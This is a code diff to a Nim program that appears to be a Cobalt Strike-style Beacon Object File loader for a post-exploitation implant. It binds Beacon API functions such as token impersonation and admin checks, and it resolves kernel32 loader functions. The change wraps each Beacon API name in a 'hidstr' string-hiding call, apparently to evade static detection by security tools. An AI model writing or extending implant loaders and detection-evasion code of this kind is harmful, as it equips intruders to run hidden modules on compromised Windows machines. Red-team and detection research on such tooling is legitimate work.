@@ -104,21 +104,21 @@ void CS_BeaconFormatInt(CS_formatp* f, int v) {
     CS_BeaconFormatAppend(f,b,4); }
 """.}
 
-  proc nimSetBofCb(fn: pointer) {.importc: "nim_set_bof_cb", cdecl.}
-  proc CS_BeaconOutput(t: cint, d: cstring, l: cint) {.importc, cdecl.}
-  proc CS_BeaconPrintf(t: cint, fmt: cstring) {.importc, cdecl, varargs.}
-  proc CS_BeaconDataParse(p: pointer, b: cstring, l: cint) {.importc, cdecl.}
-  proc CS_BeaconDataInt(p: pointer): cint {.importc, cdecl.}
-  proc CS_BeaconDataShort(p: pointer): cshort {.importc, cdecl.}
-  proc CS_BeaconDataLength(p: pointer): cint {.importc, cdecl.}
-  proc CS_BeaconDataExtract(p: pointer, sz: ptr cint): cstring {.importc, cdecl.}
-  proc CS_BeaconFormatAlloc(f: pointer, m: cint) {.importc, cdecl.}
-  proc CS_BeaconFormatReset(f: pointer) {.importc, cdecl.}
-  proc CS_BeaconFormatFree(f: pointer) {.importc, cdecl.}
-  proc CS_BeaconFormatAppend(f: pointer, d: cstring, l: cint) {.importc, cdecl.}
-  proc CS_BeaconFormatPrintf(f: pointer, fmt: cstring) {.importc, cdecl, varargs.}
-  proc CS_BeaconFormatToString(f: pointer, sz: ptr cint): cstring {.importc, cdecl.}
-  proc CS_BeaconFormatInt(f: pointer, v: cint) {.importc, cdecl.}
+  proc nimSetBofCb(fn: pointer) {.importc: "nim_set_bof_cb", cdecl, nodecl.}
+  proc CS_BeaconOutput(t: cint, d: cstring, l: cint) {.importc, cdecl, nodecl.}
+  proc CS_BeaconPrintf(t: cint, fmt: cstring) {.importc, cdecl, varargs, nodecl.}
+  proc CS_BeaconDataParse(p: pointer, b: cstring, l: cint) {.importc, cdecl, nodecl.}
+  proc CS_BeaconDataInt(p: pointer): cint {.importc, cdecl, nodecl.}
+  proc CS_BeaconDataShort(p: pointer): cshort {.importc, cdecl, nodecl.}
+  proc CS_BeaconDataLength(p: pointer): cint {.importc, cdecl, nodecl.}
+  proc CS_BeaconDataExtract(p: pointer, sz: ptr cint): cstring {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatAlloc(f: pointer, m: cint) {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatReset(f: pointer) {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatFree(f: pointer) {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatAppend(f: pointer, d: cstring, l: cint) {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatPrintf(f: pointer, fmt: cstring) {.importc, cdecl, varargs, nodecl.}
+  proc CS_BeaconFormatToString(f: pointer, sz: ptr cint): cstring {.importc, cdecl, nodecl.}
+  proc CS_BeaconFormatInt(f: pointer, v: cint) {.importc, cdecl, nodecl.}
 
   # ── WinAPI Beacon helpers ─────────────────────────────────────────────────
   proc bofIsAdmin(): cint {.cdecl.} =
@@ -164,28 +164,28 @@ void CS_BeaconFormatInt(CS_formatp* f, int v) {
     bcnN = 0
     template put(nm: string, fn: pointer) =
       bcnSlots[bcnN] = fn; bcnNames[bcnN] = nm; inc bcnN
-    put("BeaconOutput",         cast[pointer](CS_BeaconOutput))
-    put("BeaconPrintf",         cast[pointer](CS_BeaconPrintf))
-    put("BeaconDataParse",      cast[pointer](CS_BeaconDataParse))
-    put("BeaconDataInt",        cast[pointer](CS_BeaconDataInt))
-    put("BeaconDataShort",      cast[pointer](CS_BeaconDataShort))
-    put("BeaconDataLength",     cast[pointer](CS_BeaconDataLength))
-    put("BeaconDataExtract",    cast[pointer](CS_BeaconDataExtract))
-    put("BeaconFormatAlloc",    cast[pointer](CS_BeaconFormatAlloc))
-    put("BeaconFormatReset",    cast[pointer](CS_BeaconFormatReset))
-    put("BeaconFormatFree",     cast[pointer](CS_BeaconFormatFree))
-    put("BeaconFormatAppend",   cast[pointer](CS_BeaconFormatAppend))
-    put("BeaconFormatPrintf",   cast[pointer](CS_BeaconFormatPrintf))
-    put("BeaconFormatToString", cast[pointer](CS_BeaconFormatToString))
-    put("BeaconFormatInt",      cast[pointer](CS_BeaconFormatInt))
-    put("BeaconIsAdmin",        cast[pointer](bofIsAdmin))
-    put("BeaconUseToken",       cast[pointer](bofUseToken))
-    put("BeaconRevertToken",    cast[pointer](bofRevertToken))
-    put("toWideChar",           cast[pointer](bofToWideChar))
+    put(hidstr("BeaconOutput"),         cast[pointer](CS_BeaconOutput))
+    put(hidstr("BeaconPrintf"),         cast[pointer](CS_BeaconPrintf))
+    put(hidstr("BeaconDataParse"),      cast[pointer](CS_BeaconDataParse))
+    put(hidstr("BeaconDataInt"),        cast[pointer](CS_BeaconDataInt))
+    put(hidstr("BeaconDataShort"),      cast[pointer](CS_BeaconDataShort))
+    put(hidstr("BeaconDataLength"),     cast[pointer](CS_BeaconDataLength))
+    put(hidstr("BeaconDataExtract"),    cast[pointer](CS_BeaconDataExtract))
+    put(hidstr("BeaconFormatAlloc"),    cast[pointer](CS_BeaconFormatAlloc))
+    put(hidstr("BeaconFormatReset"),    cast[pointer](CS_BeaconFormatReset))
+    put(hidstr("BeaconFormatFree"),     cast[pointer](CS_BeaconFormatFree))
+    put(hidstr("BeaconFormatAppend"),   cast[pointer](CS_BeaconFormatAppend))
+    put(hidstr("BeaconFormatPrintf"),   cast[pointer](CS_BeaconFormatPrintf))
+    put(hidstr("BeaconFormatToString"), cast[pointer](CS_BeaconFormatToString))
+    put(hidstr("BeaconFormatInt"),      cast[pointer](CS_BeaconFormatInt))
+    put(hidstr("BeaconIsAdmin"),        cast[pointer](bofIsAdmin))
+    put(hidstr("BeaconUseToken"),       cast[pointer](bofUseToken))
+    put(hidstr("BeaconRevertToken"),    cast[pointer](bofRevertToken))
+    put(hidstr("toWideChar"),           cast[pointer](bofToWideChar))
     let k32 = LoadLibraryA("kernel32.dll")
-    put("LoadLibraryA",         GetProcAddress(k32, "LoadLibraryA"))
-    put("GetProcAddress",       GetProcAddress(k32, "GetProcAddress"))
-    put("FreeLibrary",          GetProcAddress(k32, "FreeLibrary"))
+    put(hidstr("LoadLibraryA"),         GetProcAddress(k32, "LoadLibraryA"))
+    put(hidstr("GetProcAddress"),       GetProcAddress(k32, "GetProcAddress"))
+    put(hidstr("FreeLibrary"),          GetProcAddress(k32, "FreeLibrary"))
 
   proc resolveBcn(name: string): pointer =
     for i in 0..<bcnN:
